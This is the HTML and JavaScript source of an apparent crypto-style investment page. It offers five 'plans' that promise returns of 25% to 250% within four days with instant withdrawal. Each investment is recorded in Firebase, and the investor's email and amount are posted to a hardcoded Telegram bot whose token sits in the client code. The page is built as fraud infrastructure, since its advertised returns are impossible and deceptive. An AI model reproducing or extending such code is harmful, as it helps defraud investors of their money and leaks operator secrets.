<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = '09886095a5987ea5673fadbf440836e647989737';
window.smartsupp||(function(d) {
	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
	c.type='text/javascript';c.charset='utf-8';c.async=true;
	c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);
</script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Investment - UI Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js">
      </script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', sans-serif;
    background: #f8fafc;
    color: #1e293b;
    min-height: 100vh;
    padding: 60px 20px 40px;
  }
  .back-btn {
    position: fixed;
    top: 20px;
    left: 20px;
    background: #334155;
    color: #fff;
    padding: 8px 14px;
    border-radius: 10px;
    font-size: 14px;
    text-decoration: none;
    transition: 0.3s;
    z-index: 10;
  }
  .back-btn:hover { background: #1e293b; }

  .page-header {
    text-align: center;
    margin-bottom: 20px;
  }
  .page-header h1 {
    font-size: 30px;
    color: #3b82f6;
    text-shadow: 0 0 8px #f1f5f9;
  }
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}

.modal-box {
  background: #fff;
  border-radius: 12px;
  padding: 2rem;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
  animation: fadeIn 0.3s ease;
  text-align: center;
}

.modal-box h2 {
  margin-top: 0;
  font-size: 1.5rem;
  color: #111827;
}

.modal-box p {
  margin: 1rem 0;
  color: #4b5563;
}

.modal-box button {
  margin-top: 1.5rem;
  padding: 0.75rem;
  background: #16a34a;
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 1rem;
  cursor: pointer;
  transition: background 0.2s ease;
}

.modal-box button:hover {
  background: #15803d;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(-20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}
  .page-header p {
    color: #334155;
    font-size: 14px;
    margin-top: 8px;
  }

  .balance-box {
    background: #ffffff;
    border: 1px solid #e2e8f0;
    padding: 12px 20px;
    border-radius: 12px;
    font-size: 15px;
    margin: 20px auto;
    max-width: 400px;
    color: #000000; /* changed to black */
    font-weight: bold; /* changed to bold */
    box-shadow: 0 0 10px rgba(59, 130, 246, 0.1);
    text-align: center;
  }

  .container {
    max-width: 600px;
    margin: auto;
    background: #ffffff;
    border-radius: 20px;
    padding: 30px 20px;
    box-shadow: 0 0 30px rgba(0,0,0,0.08);
  }

  .plans {
    display: flex;
    gap: 20px;
    flex-wrap: wrap;
    justify-content: center;
    margin-bottom: 20px;
  }

  .plan-card {
    flex: 1 1 200px;
    background: #f1f5f9;
    padding: 2rem;
    border-radius: 16px;
    box-shadow: 0 0 10px rgba(0,0,0,0.05);
    cursor: pointer;
    transition: 0.3s;
    border: 2px solid transparent;
  }

  .plan-card .plan-badge {
    font-weight: bold;
    padding: 0.3rem 0.8rem;
    border-radius: 50px;
    display: inline-block;
    margin-bottom: 1rem;
  }

  .plan-card.starter .plan-badge { background: #3b82f6; color: #fff; }
  .plan-card.silver .plan-badge { background: silver; }
  .plan-card.gold .plan-badge {
    background: linear-gradient(135deg, #f7d358, #f1c40f);
  }
  .plan-card.platinum .plan-badge {
    background: linear-gradient(135deg, #a78bfa, #8b5cf6);
    color: #fff;
  }
  .plan-card.diamond .plan-badge {
    background: linear-gradient(135deg, #c0f5ff, #00e5ff);
    color: #000;
  }

  .plan-card.starter.active {
    border-color: #3b82f6;
    box-shadow: 0 0 20px rgba(59,130,246,0.3);
  }
  .plan-card.silver.active {
    border-color: silver;
    box-shadow: 0 0 20px rgba(192,192,192,0.3);
  }
  .plan-card.gold.active {
    border-color: #fbbf24;
    box-shadow: 0 0 20px rgba(251,191,36,0.3);
  }
  .plan-card.platinum.active {
    border-color: #8b5cf6;
    box-shadow: 0 0 20px rgba(139, 92, 246, 0.4);
  }
  .plan-card.diamond.active {
    border-color: #00e5ff;
    box-shadow: 0 0 20px rgba(0, 229, 255, 0.4);
  }

  .form-group { margin-bottom: 18px; }
  label {
    display: block;
    margin-bottom: 6px;
    font-size: 14px;
    color: #334155;
  }
  input {
    width: 100%;
    padding: 14px;
    border: 1px solid #e2e8f0;
    border-radius: 12px;
    background: #ffffff;
    color: #1e293b;
    font-size: 15px;
    box-shadow: inset 0 0 6px rgba(0,0,0,0.03);
    transition: 0.3s ease;
  }
  input::placeholder {
    color: #94a3b8;
    opacity: 0.7;
  }
  input:focus {
    outline: none;
    box-shadow: 0 0 0 2px #3b82f6;
  }

  .invest-btn {
    width: 100%;
    padding: 14px;
    background: linear-gradient(135deg, #3b82f6, #60a5fa);
    border: none;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    color: #fff;
    cursor: pointer;
    transition: 0.3s;
    box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
  }
  .invest-btn:hover {
    transform: translateY(-2px);
    background: #2563eb;
  }

  .note {
    margin-top: 14px;
    font-size: 13px;
    color: #64748b;
    text-align: center;
  }

  .toast {
    position: fixed;
    bottom: -100px;
    left: 50%;
    transform: translateX(-50%);
    background: #dc2626;
    color: #fff;
    padding: 12px 24px;
    border-radius: 10px;
    font-weight: 500;
    box-shadow: 0 6px 16px rgba(220,38,38,0.3);
    transition: bottom 0.4s ease;
    z-index: 999;
  }
  .toast.show { bottom: 60px; }

  #confirmModal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.6);
    z-index: 1000;
    justify-content: center;
    align-items: center;
  }
  #confirmModal .modal-box {
    background: #ffffff;
    padding: 30px;
    border-radius: 20px;
    max-width: 420px;
    width: 90%;
    text-align: center;
    animation: fadeIn 0.3s ease-out;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
  }
  #confirmModal h2 {
    font-size: 20px;
    color: #3b82f6;
    margin-bottom: 15px;
  }
  #confirmModal p {
    color: #1e293b;
    margin-bottom: 20px;
    white-space: pre-wrap;
  }
  #confirmModal button {
    padding: 10px 20px;
    margin: 0 8px;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    cursor: pointer;
    color: #fff;
  }
  #confirmYes { background: #22c55e; }
  #confirmNo { background: #dc2626; }

  @keyframes fadeIn {
    from { opacity: 0; transform: scale(0.95); }
    to { opacity: 1; transform: scale(1); }
  }
</style>

</head>
<body>
<!-- Universal Loader -->
<div id="loader">
  <div class="loader-container">
    <div class="loader-logo">FMS</div>
    <div class="spinner-ring"></div>
  </div>
</div>

<style>
  /* Loader Styles */
  #loader {
    background: #f8fafc;
    height: 100vh;
    width: 100vw;
    position: fixed;
    top: 0;
    left: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    opacity: 1;
    transition: opacity 0.5s ease;
  }

  .loader-container {
    position: relative;
    width: 240px;
    height: 240px;
  }

  .loader-logo {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 72px;
    font-weight: bold;
    color: #3b82f6;
    user-select: none;
    white-space: nowrap;
    z-index: 2;
    animation: scalePulse 2s infinite ease-in-out;
  }

  .spinner-ring {
    position: absolute;
    top: 0;
    left: 0;
    width: 240px;
    height: 240px;
    border: 5px solid transparent;
    border-left: 5px solid #3b82f6;
    border-bottom: 5px solid rgba(59, 130, 246, 0.6);
    border-right: 5px solid rgba(59, 130, 246, 0.3);
    border-top: 5px solid transparent;
    border-radius: 50%;
    animation: spin 2s linear infinite;
    z-index: 1;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  @keyframes scalePulse {
    0%, 100% {
      transform: translate(-50%, -50%) scale(1);
    }
    50% {
      transform: translate(-50%, -50%) scale(1.2);
    }
  }
</style>

<script>
  // Loader hides after 1.5 seconds with fade-out
  window.addEventListener("load", () => {
    setTimeout(() => {
      const loader = document.getElementById("loader");
      loader.style.opacity = "0";
      setTimeout(() => {
        loader.style.display = "none";
      }, 500); // match fade transition
    }, 1500);
  });
</script>
  <a href="dashboard.html" class="back-btn">‚Üê Back</a>
  <div class="page-header">
    <h1>Invest</h1>
    <p>Choose a plan and grow your balance</p>
  </div>
  <audio id="successSound" src="base_scan_successful.mp3" preload="auto"></audio>
  <div class="balance-box">
    Wallet Balance: <span id="walletBalance">$0.00</span>
  </div>
 <div class="container">
    <div class="plans" id="planCards">
      <div class="plan-card starter active" data-plan="starter">
        <div class="plan-badge">Starter</div>
        <h3>Starter Plan</h3>
        <ul style="list-style: none; padding: 0; margin-top: 1rem; color: #aaa; font-size: 0.9rem;">
          <li>‚úî Return: 25%</li>
          <li>‚úî Duration: After 4 DAYS</li>
          <li>‚úî Minimum Amount: $100</li>
          <li>‚úî Maximum Amount: $999</li>
          <li>‚úî Instant Withdraw</li>
        </ul>
      </div>
      <div class="plan-card silver" data-plan="silver">
        <div class="plan-badge">Silver</div>
                <h3>Silver Plan</h3>
        <ul style="list-style: none; padding: 0; margin-top: 1rem; color: #aaa; font-size: 0.9rem;">
          <li>‚úî Return: 50%</li>
          <li>‚úî Duration: After 4 Days</li>
          <li>‚úî Minimum Investment: $1,000</li>
          <li>‚úî Maximum Investment: $19,999</li>
          <li>‚úî Withdrawal: Instant</li>
        </ul>
      </div>
      <div class="plan-card gold" data-plan="gold">
        <div class="plan-badge">Gold</div>
        <h3>Gold Plan</h3>
        <ul style="list-style: none; padding: 0; margin-top: 1rem; color: #aaa; font-size: 0.9rem;">
          <li>‚úî Return: 85%</li>
          <li>‚úî Duration: After 4 Days</li>
          <li>‚úî Minimum Investment: $20,000</li>
          <li>‚úî Maximum Investment: $99,999</li>
          <li>‚úî Withdrawal: Instant</li>
        </ul>
      </div>
      <div class="plan-card platinum" data-plan="platinum">
        <div class="plan-badge">Platinum</div>
        <h3>Platinum Plan</h3>
        <ul style="list-style: none; padding: 0; margin-top: 1rem; color: #aaa; font-size: 0.9rem;">
          <li>‚úî Return: 150%</li>
          <li>‚úî Duration: After 4 Days</li>
          <li>‚úî Minimum Investment: $100,000</li>
          <li>‚úî Maximum Investment: $999,999</li>
          <li>‚úî Withdrawal: Instant</li>
        </ul>
      </div>
      <div class="plan-card diamond" data-plan="diamond">
        <div class="plan-badge">Diamond</div>
        <h3>Diamond Plan</h3>
        <ul style="list-style: none; padding: 0; margin-top: 1rem; color: #aaa; font-size: 0.9rem;">
          <li>‚úî Return: 250%</li>
          <li>‚úî Duration: After 4 Days</li>
          <li>‚úî Minimum Investment: $1,000,000</li>
          <li>‚úî Maximum Investment: $10,000,000</li>
          <li>‚úî Withdrawal: Instant</li>
        </ul>
      </div>
    </div>

    <div class="form-group">
      <label for="amount">Amount to Invest ($)</label>
      <input type="number" id="amount" placeholder="Enter amount" />
    </div>
    <button class="invest-btn" id="investBtn" onclick="submitInvestment()">Start Investment</button>
    <p class="note">Returns will be paid after 4 days based on selected plan.</p>
  </div>

  <div id="confirmModal">
    <div class="modal-box">
      <h2>Confirm Investment</h2>
      <p id="confirmText"></p>
      <button id="confirmYes">Yes</button>
      <button id="confirmNo">Cancel</button>
    </div>
  </div>

  <div id="toast" class="toast">Message</div>

<div id="receiptModal" class="modal-overlay" style="display:none;">
  <div class="modal-box">
    <h2>Investment Receipt</h2>
    <p><strong>Plan:</strong> <span id="receiptPlan"></span></p>
    <p><strong>Amount Invested:</strong> $<span id="receiptAmount"></span></p>
    <p><strong>Expected Return:</strong> $<span id="receiptReturn"></span></p>
    <p><strong>Start Date:</strong> <span id="receiptDate"></span></p>
    <p><strong>Status:</strong> Active</p>
    <button onclick="document.getElementById('receiptModal').style.display='none'">Close</button>
  </div>
</div>
  <script>
    const firebaseConfig = {
    apiKey: "AIzaSyB89FVW7DW8xdASCAyNsTN71zK5p_YMSVk",
    authDomain: "titanium-fx.firebaseapp.com",
    projectId: "titanium-fx",
    storageBucket: "titanium-fx.appspot.com",
    messagingSenderId: "623119248603",
    appId: "1:623119248603:web:824489ee0033bef9bdf0fe"
  };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();

    let selectedPlan = "starter";
    const planRequirements = {
      starter:  { min: 100, max: 999, percent: 0.25 },
      silver:   { min: 1000, max: 19999, percent: 0.5 },
      gold:     { min: 20000, max: 99999, percent: 0.85 },
      platinum: { min: 100000, max: 999999, percent: 1.5 },
      diamond:  { min: 1000000, max: 10000000, percent: 2.5 }
    };

    document.querySelectorAll(".plan-card").forEach(card => {
      card.addEventListener("click", () => {
        document.querySelectorAll(".plan-card").forEach(c => c.classList.remove("active"));
        card.classList.add("active");
        selectedPlan = card.dataset.plan;
      });
    });

    function showToast(msg, success = false) {
      const t = document.getElementById("toast");
      t.textContent = msg;
      t.style.background = success ? "#16a34a" : "#dc2626";
      t.classList.add("show");
      setTimeout(() => t.classList.remove("show"), 3000);
    }

    auth.onAuthStateChanged(user => {
      if (!user) return window.location.href = "login.html";
      db.collection("users").doc(user.uid).onSnapshot(doc => {
        const bal = doc.data()?.balance || 0;
        document.getElementById("walletBalance").textContent = `$${bal.toLocaleString()}`;
      });
    });

    async function submitInvestment() {
      const btn = document.getElementById("investBtn");
      btn.disabled = true;
      btn.textContent = "Processing...";

      const user = auth.currentUser;
      if (!user) {
        showToast("Login required");
        btn.disabled = false;
        btn.textContent = "Start Investment";
        return;
      }

      const amount = parseFloat(document.getElementById("amount").value);
      const plan = planRequirements[selectedPlan];
      if (!plan || isNaN(amount) || amount < plan.min || amount > plan.max) {
        showToast(`Amount must be between $${plan.min} and $${plan.max}`);
        btn.disabled = false;
        btn.textContent = "Start Investment";
        return;
      }

      const confirmText = `You're about to invest $${amount.toLocaleString()} in the ${selectedPlan.charAt(0).toUpperCase() + selectedPlan.slice(1)} Plan.\nYou'll earn $${(amount + amount * plan.percent).toLocaleString()} after 4 days.\nProceed?`;
      document.getElementById("confirmText").innerText = confirmText;
      document.getElementById("confirmModal").style.display = "flex";

      document.getElementById("confirmYes").onclick = async () => {
        document.getElementById("confirmModal").style.display = "none";

        const udoc = await db.collection("users").doc(user.uid).get();
        const bal = udoc.data()?.balance || 0;
        if (amount > bal) {
          showToast("Insufficient balance.");
          btn.disabled = false;
          btn.textContent = "Start Investment";
          return;
        }
        const expectedReturn = amount + amount * plan.percent;
        const inv = {
          uid: user.uid,
          email: user.email || "",
          plan: selectedPlan,
          amount,
          expectedReturn,
          startDate: firebase.firestore.FieldValue.serverTimestamp(),
          status: "active"
        };

try {
  await db.collection("investments").add(inv);
  await db.collection("users").doc(user.uid).update({
  balance: firebase.firestore.FieldValue.increment(-amount),
  investment: firebase.firestore.FieldValue.increment(amount)
});

  showToast("Investment started!", true);
  document.getElementById("successSound").play().catch(e => console.log("Audio play failed:", e));
  document.getElementById("amount").value = "";

  sendTelegram(`üöÄ *New Investment*\nüë§ ${user.email}\nüí∞ $${amount.toFixed(2)}\nüìà ${selectedPlan.toUpperCase()}`);

  // Show receipt
  document.getElementById("receiptPlan").innerText = selectedPlan.charAt(0).toUpperCase() + selectedPlan.slice(1);
  document.getElementById("receiptAmount").innerText = amount.toLocaleString();
  document.getElementById("receiptReturn").innerText = (amount + amount * plan.percent).toLocaleString();
  document.getElementById("receiptDate").innerText = new Date().toLocaleString();
  document.getElementById("receiptModal").style.display = "flex";

} catch (err) {
  console.error(err);
  showToast("Failed to invest.");
}
      };

      document.getElementById("confirmNo").onclick = () => {
        document.getElementById("confirmModal").style.display = "none";
        btn.disabled = false;
        btn.textContent = "Start Investment";
      };
    }

    async function sendTelegram(msg) {
      const botToken = "8054495433:AAGZNJYKGmW9YfGSeHaV0Z6cXsED6GZYOxg";
      const chatId = "7710943481";
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      try {
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "Markdown" })
        });
      } catch (e) {
        console.error("Telegram send failed", e);
      }
    }
  </script>
</body>
</html>